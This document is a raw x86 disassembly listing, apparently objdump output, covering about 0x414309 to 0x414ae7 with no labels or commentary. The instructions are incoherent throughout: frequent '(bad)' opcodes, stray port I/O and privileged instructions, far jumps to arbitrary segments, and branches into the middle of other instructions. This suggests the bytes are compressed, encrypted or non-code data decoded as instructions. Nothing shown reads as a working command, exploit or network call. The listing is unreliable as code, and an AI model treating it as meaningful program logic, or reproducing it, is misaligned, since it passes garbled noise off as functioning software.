  414309:	or     ebp,DWORD PTR [edi+0x9]
  41430c:	(bad)  
  41430d:	or     eax,0x805f337
  414312:	xor    ebx,eax
  414314:	jle    0x414327
  414316:	dec    ecx
  414317:	stc    
  414318:	sub    DWORD PTR [edx],ecx
  41431a:	and    BYTE PTR [eax],0x70
  41431d:	sbb    ch,BYTE PTR [edi+0xf]
  414320:	gs hlt 
  414322:	aad    0x7
  414324:	cwde   
  414325:	js     0x4142f1
  414327:	adc    DWORD PTR [edx],ecx
  414329:	dec    ebx
  41432a:	ins    BYTE PTR es:[edi],dx
  41432b:	(bad)  
  41432c:	mov    edi,0x8feee600
  414331:	dec    ebp
  414332:	imul   edx,eax,0xb10898fb
  414338:	mov    cl,0x57
  41433a:	mov    ch,0xf
  41433c:	push   es
  41433d:	jecxz  0x41435e
  41433f:	stos   BYTE PTR es:[edi],al
  414340:	repnz in al,0x85
  414343:	mul    DWORD PTR [eax]
  414345:	dec    esp
  414346:	xchg   edx,eax
  414347:	hlt    
  414348:	sar    DWORD PTR [ecx+0x46ad9fe8],0x18
  41434f:	ret    
  414350:	ret    0x49b3
  414353:	test   al,0xf8
  414355:	or     DWORD PTR [esp+eiz*2-0x8],0x1a25a8c6
  41435d:	sub    eax,0x7bc59b32
  414362:	adc    edx,DWORD PTR [edx-0x2a]
  414365:	daa    
  414366:	fadd   QWORD PTR [ebp+0x67]
  414369:	retf   0x2b71
  41436c:	mov    bl,0xdd
  41436e:	nop
  41436f:	xor    DWORD PTR [ebp+0x19],0xac2d8094
  414376:	or     DWORD PTR [ebx],ebx
  414378:	les    eax,FWORD PTR [esi+ecx*1]
  41437b:	sbb    BYTE PTR [ebx-0x63f78ee9],dh
  414381:	xchg   ecx,eax
  414382:	xlat   BYTE PTR ds:[ebx]
  414383:	ss push ss
  414385:	push   0x47c2028c
  41438a:	and    ebp,ebx
  41438c:	pop    edi
  41438d:	mov    ds:0x36dc4ca,eax
  414392:	shl    DWORD PTR [ecx+edi*1-0x8f48227],0x54
  41439a:	sbb    ebx,DWORD PTR [esi+eiz*2+0x0]
  41439e:	xor    bl,ch
  4143a0:	add    bh,BYTE PTR fs:[ebx-0x73476994]
  4143a7:	cdq    
  4143a8:	sbb    dh,ch
  4143aa:	pop    esp
  4143ab:	xor    eax,0xd344d34a
  4143b0:	and    dh,BYTE PTR [edx+0x30e3c570]
  4143b6:	paddsb mm1,mm6
  4143b9:	hlt    
  4143ba:	repz (bad) 
  4143bc:	xor    BYTE PTR [edi+0x4b],cl
  4143bf:	inc    eax
  4143c0:	or     dh,BYTE PTR [esi]
  4143c2:	cmp    DWORD PTR [ebx-0x7a],0x67
  4143c6:	sahf   
  4143c7:	add    esp,ebx
  4143c9:	mov    gs,WORD PTR [ebx-0x3d08364b]
  4143cf:	test   BYTE PTR [eax+0x33],al
  4143d2:	ins    DWORD PTR es:[edi],dx
  4143d3:	ficom  WORD PTR [esp+ecx*2-0x8]
  4143d7:	mov    esp,0x93f65609
  4143dc:	jb     0x414392
  4143de:	inc    eax
  4143df:	inc    ebx
  4143e0:	sub    eax,0x8a4fed1d
  4143e5:	lock jge 0x414393
  4143e8:	ss jl  0x41437a
  4143eb:	ficomp DWORD PTR [eax]
  4143ed:	pop    es
  4143ee:	jne    0x414389
  4143f0:	cmp    BYTE PTR [ecx+0x51d4b982],dl
  4143f6:	aad    0x92
  4143f8:	popa   
  4143f9:	push   ebp
  4143fa:	enter  0xe86c,0xd7
  4143fe:	mov    bh,0x96
  414400:	pop    ds
  414401:	ja     0x414409
  414403:	mov    ch,0xe4
  414405:	mov    edx,0xa0e31428
  41440a:	inc    esi
  41440b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41440c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41440d:	sub    BYTE PTR [ebp-0x51],ch
  414410:	outs   dx,BYTE PTR ds:[esi]
  414411:	push   ecx
  414412:	retf   0xbbd9
  414415:	jnp    0x414485
  414417:	adc    al,0xb7
  414419:	js     0x414469
  41441b:	push   0xc48cf8ed
  414420:	aad    0x20
  414422:	ins    DWORD PTR es:[edi],dx
  414423:	push   esi
  414424:	(bad)  
  414425:	xor    dl,BYTE PTR [ebx]
  414427:	(bad)  
  414428:	jnp    0x4143ad
  41442a:	mov    edx,0x835ecd86
  41442f:	xor    eax,0x3bd46738
  414434:	sbb    bl,BYTE PTR [esi+edi*2]
  414437:	sar    DWORD PTR [ebx+0x5f],0xa8
  41443b:	inc    ecx
  41443c:	fisubr DWORD PTR [ecx+ebx*4-0x47]
  414440:	test   al,0xd7
  414442:	mov    esp,0x147310dc
  414447:	inc    edi
  414448:	cmp    ah,BYTE PTR [esi]
  41444a:	pop    ds
  41444b:	jmp    0xbef71ffa
  414450:	jnp    0x4144bc
  414452:	sar    esp,1
  414454:	fwait
  414455:	jmp    0x94e3:0xdf07671b
  41445c:	repnz add al,0x4c
  41445f:	aad    0x86
  414461:	pop    eax
  414462:	out    0x64,eax
  414464:	cmp    al,0xad
  414466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414467:	sti    
  414468:	iret   
  414469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41446a:	scas   eax,DWORD PTR es:[edi]
  41446b:	retf   0xe266
  41446e:	push   ecx
  41446f:	xor    al,0x3b
  414471:	jnp    0x4144ee
  414473:	cmp    eax,0xdb388a0d
  414478:	jbe    0x41445b
  41447a:	rcr    DWORD PTR [ebp-0x51b6b2bc],0xdb
  414481:	imul   edx,DWORD PTR [ecx+edx*8-0x20],0xd9c562f8
  414489:	(bad)  
  41448a:	push   ds
  41448b:	push   eax
  41448c:	mov    ds:0x5b41a00a,eax
  414491:	mov    al,0x7c
  414493:	jb     0x414438
  414495:	stos   BYTE PTR es:[edi],al
  414496:	lahf   
  414497:	fstp   QWORD PTR [edi]
  414499:	sbb    bh,al
  41449b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41449c:	popf   
  41449d:	mov    eax,ds:0x31f3d046
  4144a2:	push   esp
  4144a3:	push   ebp
  4144a4:	xchg   ecx,eax
  4144a5:	dec    eax
  4144a6:	iret   
  4144a7:	mov    edi,0xaa6bfbb3
  4144ac:	add    eax,0x52594c73
  4144b1:	mov    cl,0x63
  4144b3:	(bad)  
  4144b6:	pop    ds
  4144b7:	mov    al,ds:0x33146287
  4144bc:	mov    dh,0x16
  4144be:	imul   esp,DWORD PTR [edi-0x5a],0xf56bcc38
  4144c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144c6:	or     ecx,0x67380feb
  4144cc:	add    DWORD PTR [esi+0x7c],edx
  4144cf:	div    DWORD PTR [edx+ecx*4-0x28]
  4144d3:	and    ah,dl
  4144d5:	loope  0x4144da
  4144d7:	jg     0x41451a
  4144d9:	cs gs stos DWORD PTR es:[edi],eax
  4144dc:	out    dx,al
  4144dd:	xlat   BYTE PTR ds:[ebx]
  4144de:	xor    DWORD PTR [esi],esp
  4144e0:	sbb    BYTE PTR [eax+0x27],bh
  4144e3:	mov    ebp,DWORD PTR [ecx+0x61]
  4144e6:	mov    esp,0xd50b86de
  4144eb:	push   eax
  4144ec:	fist   DWORD PTR [esi+0x706485d4]
  4144f2:	ins    DWORD PTR es:[edi],dx
  4144f3:	adc    eax,0xe61ceb20
  4144f8:	call   0x2ded0979
  4144fd:	dec    ebp
  4144fe:	dec    edx
  4144ff:	test   al,0x45
  414501:	int    0x81
  414503:	and    eax,0x6e1deafa
  414508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414509:	mov    al,0x1c
  41450b:	add    DWORD PTR [esi-0x438bb508],eax
  414511:	mov    al,al
  414513:	sbb    BYTE PTR [edx],ch
  414515:	aad    0xb5
  414517:	adc    esi,ebx
  414519:	ds or  esp,DWORD PTR es:[edx+0x7d679eb4]
  414521:	(bad)  
  414522:	daa    
  414523:	adc    dh,dh
  414525:	push   edx
  414526:	xchg   ebp,eax
  414527:	repnz (bad)
  41452a:	mov    ebx,0xf59b9165
  41452f:	inc    ebx
  414530:	cmp    eax,0xf9cf2987
  414535:	or     BYTE PTR [edx-0xb],ah
  414538:	test   ebp,0x47c3afe1
  41453e:	lea    ecx,[esi+0x12e5e919]
  414544:	les    esi,FWORD PTR [eax+0x4a]
  414547:	imul   BYTE PTR [edi+0x26]
  41454a:	and    BYTE PTR [ebx],bh
  41454c:	es cmp eax,0xdb94db46
  414552:	in     al,0x98
  414554:	push   esp
  414555:	es sub eax,0xfd47851
  41455b:	sub    cl,BYTE PTR [esi+ebx*1-0x64c9bd28]
  414562:	imul   ecx,DWORD PTR [ebx-0x1e804579],0xc9acc0b0
  41456c:	mov    bl,0x3d
  41456e:	ins    DWORD PTR es:[edi],dx
  41456f:	adc    ebx,DWORD PTR gs:[edx+ebp*2-0x443a41f7]
  414577:	imul   esi,DWORD PTR [esi-0x704123b1],0x6
  41457e:	sbb    dl,dh
  414580:	iret   
  414581:	retf   
  414582:	jo     0x4145a7
  414584:	ja     0x41454a
  414586:	sub    cl,BYTE PTR [edx-0x5607e4d0]
  41458c:	mov    al,ds:0x12fa2edf
  414591:	jmp    0x4145ab
  414593:	int    0x33
  414595:	es dec ebx
  414597:	sti    
  414598:	xor    eax,0x191de656
  41459d:	mov    al,0x7c
  41459f:	xlat   BYTE PTR ds:[ebx]
  4145a0:	scas   al,BYTE PTR es:[edi]
  4145a1:	jl     0x41460b
  4145a3:	jle    0x4145f1
  4145a5:	adc    DWORD PTR [esi],edi
  4145a7:	inc    eax
  4145a8:	mov    bh,0x61
  4145aa:	sub    BYTE PTR [ecx+0x1a],dl
  4145ad:	xor    DWORD PTR [ebp+eax*8+0x4a],eax
  4145b1:	push   0x11
  4145b3:	jl     0x4145c5
  4145b5:	cmp    dl,BYTE PTR [ecx]
  4145b7:	jnp    0x41457e
  4145b9:	lods   al,BYTE PTR ds:[esi]
  4145ba:	pop    es
  4145bb:	mov    bl,0xde
  4145bd:	inc    ebp
  4145be:	pop    edi
  4145bf:	cmp    bl,BYTE PTR [ebp-0x34]
  4145c2:	push   es
  4145c3:	xchg   esi,eax
  4145c4:	or     BYTE PTR [ebx],bl
  4145c6:	repnz clc 
  4145c8:	push   ebx
  4145c9:	fincstp 
  4145cb:	ret    
  4145cc:	aaa    
  4145cd:	popa   
  4145ce:	inc    edx
  4145cf:	fsub   QWORD PTR [edi]
  4145d1:	jp     0x414629
  4145d3:	mov    esi,0xefa02966
  4145d8:	ss out 0x6f,al
  4145db:	sub    ebp,DWORD PTR [eax]
  4145dd:	fucomp st(2)
  4145df:	dec    ecx
  4145e0:	mov    ebp,0x16d405d4
  4145e5:	or     DWORD PTR [edx],ebx
  4145e7:	or     DWORD PTR [esp+0x29429f88],0xf8eee77a
  4145f2:	jb     0x414670
  4145f4:	repz cmp BYTE PTR [ebx+0x534d60af],ch
  4145fb:	pcmpgtb mm5,QWORD PTR [eax-0x9]
  4145ff:	(bad)  
  414600:	shr    DWORD PTR [edi-0x6c],1
  414603:	jne    0x41466b
  414605:	std    
  414606:	sub    ch,dh
  414608:	cmc    
  414609:	jp     0x41467d
  41460b:	xor    edx,esi
  41460d:	ret    0x1d8e
  414610:	iret   
  414611:	or     al,0x7f
  414613:	push   cs
  414614:	nop
  414615:	adc    eax,eax
  414617:	shl    ecx,cl
  414619:	xchg   ebp,eax
  41461a:	xchg   esp,eax
  41461b:	adc    eax,DWORD PTR [eax+0x18933781]
  414621:	pop    esi
  414622:	pop    eax
  414623:	out    dx,al
  414624:	lock cmp BYTE PTR ds:0xf22a8ef9,al
  41462b:	cmp    eax,0x8ed98db5
  414630:	push   ecx
  414631:	test   BYTE PTR [ecx+0x22be3723],dl
  414637:	adc    al,0x8c
  414639:	xor    DWORD PTR [eax],esi
  41463b:	jg     0x414630
  41463d:	mov    BYTE PTR [ebx-0x77],0x9b
  414641:	adc    DWORD PTR [eax+0x2d],ebp
  414644:	xchg   esp,eax
  414645:	inc    edx
  414646:	rcl    DWORD PTR [edi-0x6aa9cc46],cl
  41464c:	jecxz  0x4146bd
  41464e:	jbe    0x41469c
  414650:	jbe    0x4146bb
  414652:	inc    eax
  414653:	cmp    al,0x2e
  414655:	adc    eax,0xf93c7e42
  41465a:	and    bh,dh
  41465c:	cs sub bl,bh
  41465f:	adc    edx,edx
  414661:	lods   al,BYTE PTR ds:[esi]
  414662:	lods   al,BYTE PTR ds:[esi]
  414663:	sub    al,0xe3
  414665:	pop    ebp
  414666:	xchg   ebx,eax
  414667:	inc    esi
  414668:	push   esi
  414669:	add    eax,0xe73665ba
  41466e:	in     eax,0x9
  414670:	loopne 0x414652
  414672:	jbe    0x41469f
  414674:	fstp   QWORD PTR [eax-0x3a2eb656]
  41467a:	loopne 0x414669
  41467c:	loopne 0x4146f3
  41467e:	sbb    esi,DWORD PTR [edi+ebx*8+0x2981578e]
  414685:	sbb    esp,esp
  414687:	mov    bl,0x24
  414689:	and    al,BYTE PTR [esi-0x25]
  41468c:	shl    DWORD PTR [esi],1
  41468e:	arpl   WORD PTR [ecx+0x8],di
  414691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414692:	push   ecx
  414693:	and    eax,0x5f49232f
  414698:	cmp    edi,DWORD PTR [esi]
  41469a:	aad    0x10
  41469c:	icebp  
  41469d:	jae    0x4146b7
  41469f:	ds fs out dx,al
  4146a2:	outs   dx,DWORD PTR ds:[esi]
  4146a3:	(bad)  
  4146a4:	cld    
  4146a5:	sub    DWORD PTR [ebx+0x7a],esp
  4146a8:	sbb    BYTE PTR [edi+esi*4+0x0],ch
  4146ac:	data16 cmp BYTE PTR [esi],0xfd
  4146b0:	mov    edx,0xbce9e29
  4146b5:	pop    edi
  4146b6:	fs xor eax,0xc6a2146b
  4146bc:	xchg   ebx,eax
  4146bd:	sub    ecx,DWORD PTR [esi-0x1702f578]
  4146c3:	ret    0x5251
  4146c6:	(bad)  
  4146c7:	adc    esp,ebp
  4146c9:	aam    0xf7
  4146cb:	(bad)  
  4146cc:	(bad)  
  4146cd:	fisubr DWORD PTR [ebp+esi*8+0x5]
  4146d1:	mov    edi,0x34f78cd7
  4146d6:	lods   al,BYTE PTR ds:[esi]
  4146d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146d8:	js     0x4146dc
  4146da:	into   
  4146db:	mov    ds:0xbd29bc54,al
  4146e0:	sub    DWORD PTR [edi-0x64ccca42],ebx
  4146e6:	in     al,dx
  4146e7:	sub    eax,edx
  4146e9:	cdq    
  4146ea:	sub    ebx,DWORD PTR [esi]
  4146ec:	sub    bl,BYTE PTR [edx]
  4146ee:	sti    
  4146ef:	mov    dh,0x82
  4146f1:	add    eax,DWORD PTR [edi+ecx*8+0xb93aca0]
  4146f8:	push   eax
  4146f9:	loopne 0x4146ea
  4146fb:	sbb    eax,0x5f5bf7c3
  414700:	ret    
  414701:	fisttp DWORD PTR ds:[ebx]
  414704:	inc    ebx
  414705:	or     al,0xe4
  414707:	imul   ecx,DWORD PTR cs:[edx-0x7e],0x868f4f7
  41470f:	into   
  414710:	xchg   BYTE PTR [ebx-0x4c445443],ah
  414716:	mov    esi,esp
  414718:	cmp    eax,0x92c42156
  41471d:	enter  0x881a,0x2b
  414721:	jo     0x4146cf
  414723:	gs cmp esp,eax
  414726:	test   BYTE PTR [edx+0x3e],bl
  414729:	lock (bad) 
  41472b:	in     al,dx
  41472c:	fstp   TBYTE PTR [esp+eax*8-0x3e]
  414730:	jns    0x41474a
  414732:	and    al,0x59
  414734:	or     DWORD PTR [edi+ecx*8-0x76],eax
  414738:	enter  0x1365,0xc8
  41473c:	sar    DWORD PTR [bx+di+0x1219],0xd
  414742:	inc    edi
  414743:	jmp    0x5567:0x785b5203
  41474a:	cmc    
  41474b:	ds inc esp
  41474d:	mov    ch,0x25
  41474f:	call   0xf2d75259
  414754:	push   edx
  414755:	imul   ecx,DWORD PTR [esi-0x1b41bac1],0xc
  41475c:	sbb    BYTE PTR [eax-0x79c33f07],ah
  414762:	imul   ebx,ebp,0x741bedd9
  414768:	mov    dh,0x8a
  41476a:	outs   dx,BYTE PTR ds:[esi]
  41476b:	addr16 dec esp
  41476d:	nop
  41476e:	rcl    BYTE PTR [ebx],1
  414770:	jmp    0x414708
  414772:	xor    ecx,DWORD PTR [ecx+0x43]
  414775:	ins    DWORD PTR es:[edi],dx
  414776:	jmp    0xadef7760
  41477b:	mov    eax,ds:0xf7264efd
  414780:	cmc    
  414781:	sbb    DWORD PTR [esi],ebp
  414783:	adc    DWORD PTR [edi+0x5b],edx
  414786:	lahf   
  414787:	fnstcw WORD PTR [eax]
  414789:	adc    BYTE PTR [edx-0x2040b85a],ch
  41478f:	mov    cl,0x89
  414791:	jns    0x4147e2
  414793:	xchg   BYTE PTR [edx-0x10dc2452],bl
  414799:	lods   al,BYTE PTR ds:[esi]
  41479a:	lods   eax,DWORD PTR ds:[esi]
  41479b:	out    0x4a,eax
  41479d:	shl    BYTE PTR [ecx-0x3c5f5d43],cl
  4147a3:	mul    cl
  4147a5:	jecxz  0x41477b
  4147a7:	fsubr  QWORD PTR [ebp+0x14bd73f1]
  4147ad:	shl    bl,0x8b
  4147b0:	stc    
  4147b1:	dec    edi
  4147b2:	outs   dx,DWORD PTR ds:[esi]
  4147b3:	fisttp WORD PTR [edx-0x3b3f12c8]
  4147b9:	pushf  
  4147ba:	mov    ch,0x3b
  4147bc:	jle    0x414747
  4147be:	imul   BYTE PTR [edi-0xa3b280c]
  4147c4:	retf   0x1405
  4147c7:	iret   
  4147c8:	jg     0x4147c0
  4147ca:	in     al,0x43
  4147cc:	or     BYTE PTR [eax],dh
  4147ce:	in     al,0x2e
  4147d0:	dec    esi
  4147d1:	pusha  
  4147d2:	pop    esp
  4147d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147d4:	dec    edi
  4147d5:	scas   al,BYTE PTR es:[edi]
  4147d6:	aam    0x62
  4147d8:	or     eax,edi
  4147da:	lahf   
  4147db:	call   0x8:0x5dd945b3
  4147e2:	bound  edi,QWORD PTR [edx-0x72]
  4147e5:	and    eax,0x7482fcb8
  4147ea:	jo     0x4147e7
  4147ec:	pop    ecx
  4147ed:	and    al,0x81
  4147ef:	popw   es
  4147f1:	outs   dx,BYTE PTR ds:[esi]
  4147f2:	push   ss
  4147f3:	sub    bh,cl
  4147f5:	mov    dl,0x3
  4147f7:	sub    edx,esp
  4147f9:	dec    edi
  4147fa:	(bad)  
  4147fb:	in     al,dx
  4147fc:	pop    ebp
  4147fd:	imul   edx,DWORD PTR [ecx+0x3f7b6616],0x85517bb0
  414807:	loop   0x41478e
  414809:	pop    esp
  41480a:	jl     0x4147c8
  41480c:	imul   ebx,DWORD PTR [ecx-0x2c],0x839a801e
  414813:	ret    0x49c1
  414816:	stos   DWORD PTR es:[edi],eax
  414817:	dec    esp
  414818:	adc    ah,dl
  41481a:	sbb    BYTE PTR [ebp+0x6de516d0],0x4a
  414821:	clc    
  414822:	daa    
  414823:	popf   
  414824:	retf   
  414825:	test   DWORD PTR [edx],ebx
  414827:	cmp    BYTE PTR [esi-0x2e49da85],0x5a
  41482e:	cmp    esp,DWORD PTR [eax+0x3a758f1b]
  414834:	(bad)  [ebp+0x7e]
  414837:	push   ebx
  414838:	(bad)  
  414839:	jmp    0x414848
  41483b:	test   DWORD PTR [eax-0x73],eax
  41483e:	sbb    ah,BYTE PTR [ebx+0x6c]
  414841:	inc    ax
  414843:	xlat   BYTE PTR ds:[ebx]
  414844:	cdq    
  414845:	js     0x4147f5
  414847:	sbb    eax,0xf1a57eb7
  41484c:	scas   al,BYTE PTR es:[edi]
  41484d:	xchg   ebx,eax
  41484e:	mov    al,ds:0x6f47599e
  414853:	mov    edi,DWORD PTR [eax+0x35bd573a]
  414859:	sbb    DWORD PTR [ebp-0xc0f5d9e],edx
  41485f:	scas   al,BYTE PTR es:[edi]
  414860:	or     DWORD PTR [ecx-0x17],esp
  414863:	jne    0x4147ed
  414865:	sti    
  414866:	sbb    BYTE PTR [ebx+0x11],al
  414869:	rcl    DWORD PTR [edi+0x761ddc39],cl
  41486f:	pcmpgtb mm1,QWORD PTR [ecx+0x29]
  414873:	mov    ds:0x959743dd,eax
  414878:	cmc    
  414879:	js     0x41484b
  41487b:	mov    ds:0x752bf696,eax
  414880:	jp     0x414885
  414882:	inc    ebp
  414883:	cmp    ch,BYTE PTR [esi+0x8]
  414886:	and    DWORD PTR [ebp-0x17],0x5d
  41488a:	mov    esi,0x1dfe4bfd
  41488f:	dec    edx
  414890:	mov    ch,0xdd
  414892:	std    
  414893:	push   eax
  414894:	aaa    
  414895:	push   es
  414896:	and    DWORD PTR [edi+eiz*4],ebp
  414899:	mov    ch,0xc5
  41489b:	mov    ebx,0x111927c5
  4148a0:	cmc    
  4148a1:	push   edi
  4148a2:	out    0x8f,eax
  4148a4:	das    
  4148a5:	sub    esp,DWORD PTR [edx-0x23]
  4148a8:	test   eax,0xf5fc0aef
  4148ad:	jmp    0x19ad:0xd7f19c28
  4148b4:	dec    eax
  4148b5:	fdivrp st(7),st
  4148b7:	out    0x9a,eax
  4148b9:	pop    ss
  4148ba:	xor    al,0xe6
  4148bc:	mov    dl,0xa0
  4148be:	jo     0x414911
  4148c0:	cs retf 0xd2d6
  4148c4:	cld    
  4148c5:	imul   eax,DWORD PTR [edx],0x64
  4148c8:	lds    esp,FWORD PTR [ebp-0x1d]
  4148cb:	test   DWORD PTR [ebx],ecx
  4148cd:	adc    BYTE PTR [esi+ebx*8],ch
  4148d0:	icebp  
  4148d1:	jnp    0x414943
  4148d3:	cmp    dl,bh
  4148d5:	nop    DWORD PTR [edi-0x474744e7]
  4148dc:	dec    edi
  4148dd:	jns    0x41492b
  4148df:	out    0xee,al
  4148e1:	rcr    DWORD PTR [eax-0x6],1
  4148e4:	sub    al,0xb0
  4148e6:	add    al,0x1f
  4148e8:	jl     0x414891
  4148ea:	jp     0x4148ef
  4148ec:	test   BYTE PTR [esi],dh
  4148ee:	pop    ss
  4148ef:	inc    eax
  4148f0:	int    0x62
  4148f2:	inc    ebx
  4148f3:	push   ebp
  4148f4:	pop    eax
  4148f5:	mov    eax,0xaaeecff9
  4148fa:	fimul  WORD PTR [ebp-0x1a0132bb]
  414900:	call   0x8dbe6154
  414905:	xchg   ebp,eax
  414906:	cmp    BYTE PTR [edx+0x72703a24],cl
  41490c:	loop   0x414974
  41490e:	pop    edi
  41490f:	add    BYTE PTR ds:0x5488c990,al
  414915:	sbb    bh,BYTE PTR [esi-0x5b]
  414918:	xor    BYTE PTR [edx+0x52],bl
  41491b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41491c:	cli    
  41491d:	clc    
  41491e:	pusha  
  41491f:	jo     0x4148c2
  414921:	mov    bl,0xe8
  414923:	cli    
  414924:	test   DWORD PTR [edi],esp
  414926:	lock cmp ch,BYTE PTR ds:0xc160dd2f
  41492d:	mov    cs,esi
  41492f:	xchg   edx,edi
  414931:	xor    ah,ch
  414933:	inc    ebp
  414934:	out    0xf4,al
  414936:	mov    bl,0x51
  414938:	cli    
  414939:	xor    ebx,DWORD PTR [ebx]
  41493b:	pop    ebx
  41493c:	jo     0x414938
  41493e:	loopne 0x414922
  414940:	addr16 adc ebx,ebp
  414943:	jno    0x414960
  414945:	mov    ds:0xec833b2b,al
  41494a:	jmp    0x41498b
  41494c:	and    ebp,DWORD PTR [eax]
  41494e:	ins    BYTE PTR es:[edi],dx
  41494f:	add    edx,0xaec6e87
  414955:	jecxz  0x41499a
  414957:	sub    eax,0xc8152cff
  41495c:	sub    BYTE PTR [eax],al
  41495e:	mov    eax,DWORD PTR [eax-0x352f6a98]
  414964:	push   edi
  414965:	out    0x9,eax
  414967:	bound  ebp,QWORD PTR [esi+0x69]
  41496a:	shr    ebp,cl
  41496c:	pop    edx
  41496d:	sbb    bl,0x3f
  414970:	loopne 0x414905
  414972:	push   ds
  414973:	pop    ebp
  414974:	pushf  
  414975:	rcl    DWORD PTR [edx],1
  414977:	push   ds
  414978:	mov    dh,BYTE PTR [eax+0x1d0b8fb2]
  41497e:	daa    
  41497f:	jns    0x414998
  414981:	pop    ebp
  414982:	cs sti 
  414984:	leave  
  414985:	push   ss
  414986:	xchg   ecx,eax
  414987:	fucomi st,st(7)
  414989:	adc    dl,bh
  41498b:	pop    ds
  41498c:	adc    eax,0xcc93772c
  414991:	shl    BYTE PTR fs:[eax],0xac
  414995:	pop    eax
  414996:	pop    ss
  414997:	jbe    0x41493d
  414999:	cmp    DWORD PTR [ecx-0x3fab3a39],edi
  41499f:	push   DWORD PTR [edx+0x467c3ef4]
  4149a5:	xor    ebx,DWORD PTR [edi]
  4149a7:	pop    edx
  4149a8:	and    ch,BYTE PTR [edx+0x20]
  4149ab:	js     0x41495d
  4149ad:	loope  0x41494d
  4149af:	xor    eax,ecx
  4149b1:	or     BYTE PTR [bx],0xb3
  4149b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149b6:	or     al,0x61
  4149b8:	test   ah,cl
  4149ba:	icebp  
  4149bb:	(bad)
  4149be:	test   al,0x1c
  4149c0:	and    DWORD PTR ds:[ebx-0x3759da4f],edi
  4149c7:	test   eax,0x8c9d344f
  4149cc:	mov    ecx,0x2eb93fe9
  4149d1:	dec    eax
  4149d2:	xchg   esi,eax
  4149d3:	call   0x4b7d:0xa9d2657c
  4149da:	jmp    0x41496e
  4149dc:	ins    DWORD PTR es:[edi],dx
  4149dd:	aaa    
  4149de:	mov    cl,0x64
  4149e0:	test   BYTE PTR [ebp+0x6a],al
  4149e3:	shr    BYTE PTR [esi-0x36e77f29],0x25
  4149ea:	test   bl,bl
  4149ec:	bound  esp,QWORD PTR [edi]
  4149ee:	sub    bl,0x23
  4149f1:	and    al,0xa3
  4149f3:	retf   
  4149f4:	xchg   ebx,eax
  4149f5:	pop    esp
  4149f6:	stc    
  4149f7:	adc    edi,edi
  4149f9:	or     eax,0x7b9c3708
  4149fe:	sbb    esi,eax
  414a00:	test   al,dh
  414a02:	shr    BYTE PTR [edx+ebp*1+0x65ce686c],cl
  414a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a0a:	jle    0x4149e7
  414a0c:	int3   
  414a0d:	inc    ebx
  414a0e:	xor    bh,BYTE PTR gs:[edx-0x71]
  414a12:	inc    edi
  414a13:	lahf   
  414a14:	mov    ch,0xb2
  414a16:	(bad)  
  414a17:	(bad)  [ebp+0x3e]
  414a1a:	mov    DWORD PTR ds:0x5d8c6bb,esi
  414a20:	sub    esi,ecx
  414a22:	xor    DWORD PTR [ebx+0x1e],esi
  414a25:	push   ebx
  414a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a27:	test   DWORD PTR [ebp-0x32254074],esp
  414a2d:	inc    esi
  414a2e:	adc    esp,DWORD PTR [esi+0x22b6c379]
  414a34:	in     eax,0x8b
  414a36:	jae    0x4149f4
  414a38:	call   0xd3212bbb
  414a3d:	sub    edi,edx
  414a3f:	std    
  414a40:	jmp    0x17:0xd5b1ce8
  414a47:	ret    
  414a48:	ins    DWORD PTR es:[edi],dx
  414a49:	stos   BYTE PTR es:[edi],al
  414a4a:	js     0x4149fd
  414a4c:	sub    BYTE PTR [ebp-0x7d],ah
  414a4f:	add    ah,dh
  414a51:	or     DWORD PTR [esi],edx
  414a53:	repnz into 
  414a55:	lds    esp,FWORD PTR [ecx+0x61ca2fa2]
  414a5b:	fisub  DWORD PTR [edx-0x366113d]
  414a61:	push   es
  414a62:	stos   BYTE PTR es:[edi],al
  414a63:	pushf  
  414a64:	ins    DWORD PTR es:[edi],dx
  414a65:	dec    eax
  414a66:	inc    esp
  414a67:	push   0xdda03081
  414a6c:	lods   eax,DWORD PTR ds:[esi]
  414a6d:	aaa    
  414a6e:	aas    
  414a6f:	and    ah,BYTE PTR [esi]
  414a71:	sbb    dh,ch
  414a73:	jnp    0x414a93
  414a75:	inc    edx
  414a76:	xor    DWORD PTR [edx],0x69
  414a79:	push   0x5ef62bd1
  414a7e:	mov    edi,DWORD PTR [ebx+0x38e3438a]
  414a84:	push   ds
  414a85:	dec    edi
  414a86:	test   eax,0xf2f60db0
  414a8b:	add    DWORD PTR [ebp+0x1fd7742a],esi
  414a91:	in     eax,0xe9
  414a93:	xchg   sp,ax
  414a95:	dec    edi
  414a96:	iret   
  414a97:	call   0xf83140a2
  414a9c:	into   
  414a9d:	xchg   edi,eax
  414a9e:	jnp    0x414a6c
  414aa0:	nop
  414aa1:	mov    ebx,0x957b6834
  414aa6:	pop    esi
  414aa7:	ins    DWORD PTR es:[edi],dx
  414aa8:	push   ebx
  414aa9:	lock hlt 
  414aab:	(bad)  
  414aac:	int    0x5b
  414aae:	mov    eax,0xcae36ad9
  414ab3:	push   ebp
  414ab4:	fisttp QWORD PTR [edi]
  414ab6:	or     eax,0xfd6f05aa
  414abb:	or     BYTE PTR [edx+0x2561d7d7],dl
  414ac1:	ds js  0x414a76
  414ac4:	cmp    BYTE PTR [edi-0x35ae7fde],ch
  414aca:	sub    edx,DWORD PTR [edi]
  414acc:	mov    al,ds:0x51ccbcb
  414ad1:	sub    edi,edi
  414ad3:	sbb    BYTE PTR [edi],ah
  414ad5:	dec    eax
  414ad6:	xlat   BYTE PTR ds:[ebx]
  414ad7:	jecxz  0x414aee
  414ad9:	dec    eax
  414ada:	out    0x76,al
  414adc:	mov    bh,0xa8
  414ade:	stc    
  414adf:	push   ebx
  414ae0:	jo     0x414afb
  414ae2:	mov    bl,0x45
  414ae4:	jbe    0x414a9c
  414ae6:	outs   dx,BYTE PTR ds:[esi]
  414ae7:	cmp    ebp,DWORD PTR [edi]
